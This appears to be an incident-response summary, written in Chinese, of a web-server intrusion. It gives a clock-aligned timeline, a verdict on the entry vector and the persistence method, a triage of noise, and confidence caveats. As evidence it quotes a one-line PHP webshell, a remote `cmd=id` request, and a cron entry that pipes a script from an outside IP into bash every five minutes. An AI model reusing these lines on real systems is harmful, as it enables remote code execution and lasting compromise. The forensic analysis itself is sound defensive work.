# web01 入侵取证结论摘要（2026-10-01 凌晨，UTC）

分析脚本：`scripts/forensic_analysis.py`（`python -I scripts/forensic_analysis.py evidence timeline.json` 可复跑）。
完整时间线见 `timeline.json`（58 条事件，含 50 条噪声）。

## 1. 时钟对齐

| 物证 | 时钟 | 对齐方式 |
|---|---|---|
| `evidence/bash_history.txt` | epoch 秒（`#1790822490` 等） | 精确转换为 UTC，**作为基准时钟** |
| `evidence/auth_excerpt.log` | syslog `Oct 01 HH:MM:SS`，无年份/时区 | 年份 2026 由 `files.txt` 推得；时区按主机本地时间=UTC 处理（假设） |
| `evidence/files.txt` | `YYYY-MM-DD HH:MM` mtime | 按主机本地时间=UTC 处理（假设），**置信度低**，见第 5 节 |

## 2. 关键时间线（非噪声事件，UTC）

| 时间 | 事件 | 物证 |
|---|---|---|
| 01:58 | /etc/passwd mtime 变化（无旁证，未定性） | `evidence/files.txt:1` |
| 02:05 | `shell.php` mtime（www-data 所有） | `evidence/files.txt:2` |
| 02:15 | www-data crontab 文件 mtime | `evidence/files.txt:3` |
| 02:40:00 | `cd /var/www/html/uploads` | `evidence/bash_history.txt:52` |
| 02:41:30 | `php -r 'system($_GET[cmd]);' > shell.php` | `evidence/bash_history.txt:54` |
| 02:42:07 | `crontab -e` | `evidence/bash_history.txt:56` |
| 12:19 | `GET /uploads/shell.php?cmd=id` 200（webshell 被远程执行） | `evidence/auth_excerpt.log:26` |
| 12:33 | `POST /upload.php` 200 (shell.php)（上传入口） | `evidence/auth_excerpt.log:27` |

## 3. 判定

**入口向量：Web Shell 上传（upload.php 文件上传漏洞）**，支撑物证：
- `evidence/auth_excerpt.log:27` — `POST /upload.php 200 (shell.php)`，上传接口被用来投递 shell.php；
- `evidence/auth_excerpt.log:26` — `GET /uploads/shell.php?cmd=id`，webshell 可被远程执行；
- `evidence/bash_history.txt:54` — shell.php 内容为 `system($_GET[cmd])`，典型一句话 webshell；
- `evidence/files.txt:2` — shell.php 属主为 **www-data**，说明写入发生在 Web 服务上下文，而非 SSH 会话。

**持久化：cron 定时任务（www-data 账户）**，支撑物证：
- `evidence/crontab.txt:3` — `*/5 * * * * curl -s http://203.0.113.66/x.sh | bash`，每 5 分钟拉取并执行远程脚本（`crontab.txt:2` 的 healthcheck 为正常业务任务，不算）；
- `evidence/bash_history.txt:56` — 攻击序列末尾执行 `crontab -e`；
- `evidence/files.txt:3` — `/var/spool/cron/crontabs/www-data` mtime 落在入侵窗口内。

**涉事账户：www-data（Web 服务上下文）**。`ops` 账户的 SSH 登录均为噪声（见下）。

## 4. 噪声（日常运维，不作为异常上报）

- `evidence/auth_excerpt.log:1-25` — 25 条 `ops` 用户 publickey 登录，全部来自内网 10.20.1.0/24，时间分布全天、无失败爆破特征，属正常运维；
- `evidence/bash_history.txt` 中的 `cd /var/log`、`tail -f app.log`、`git pull`、`ls -la`、`systemctl status nginx` — 例行巡检命令；
- `evidence/files.txt:1` — /etc/passwd mtime 变化，但历史命令与日志中无任何加用户/改密码的旁证，**不定性为异常**，建议人工复核；
- `evidence/crontab.txt:2` — healthcheck 为正常业务 cron。

## 5. 时间戳依赖性说明

**依赖文件时间戳的判断（低置信度）**：
- `files.txt` 三条 mtime（01:58 / 02:05 / 02:15）用于圈定"入侵发生在凌晨"的时间窗口。但 shell.php 与 crontab 的 mtime 比 `bash_history` 中**创建它们的命令**（02:41:30 / 02:42:07 UTC）还早约 27–36 分钟——同一时钟下不可能，说明存在时钟偏移或攻击者 timestomp。因此 mtime 只用于粗粒度定窗，不用于排序。

**依赖日志/历史时间戳的判断（较高置信度）**：
- 攻击序列 `cd uploads → 写 shell.php → crontab -e`（02:40–02:42 UTC）由 epoch 时间戳锚定，epoch 无歧义，是本次最可靠的排序依据。

**仅为推断、无时间戳支撑的判断**：
- "入口是 upload.php 上传漏洞"——日志只证明 POST 成功且 shell.php 随后可执行，上传点的具体漏洞类型是推断；
- `auth_excerpt.log:26-27` 两条 Web 日志时间为 12:19/12:33，与 02:05 的 shell.php mtime 不在同一窗口，且 GET 在 POST 之前，提示这两条 Web 日志与 sshd 日志可能不同时钟（或 12:33 为二次上传/日志被搅动）；该顺序矛盾本身即按"时钟未对齐"处理而非攻击事实；
- 年份 2026 由 `files.txt` 推得，auth 日志本身不含年份；
- "ops 登录为噪声"基于源 IP 网段与行为模式的统计判断，若 10.20.1.0/24 中存在被控主机则结论需修正。
